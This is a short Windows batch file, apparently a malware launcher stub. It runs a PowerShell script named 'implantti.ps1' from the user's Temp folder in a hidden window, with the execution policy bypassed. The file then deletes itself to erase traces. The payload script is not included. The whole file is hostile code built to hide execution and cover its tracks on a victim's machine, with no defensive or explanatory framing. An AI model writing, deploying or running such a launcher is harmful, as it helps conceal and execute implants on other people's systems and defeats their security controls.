@echo off
start /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "C:\Users\%username%\AppData\Local\Temp\implantti.ps1"

start /b cmd /c del "%~f0"
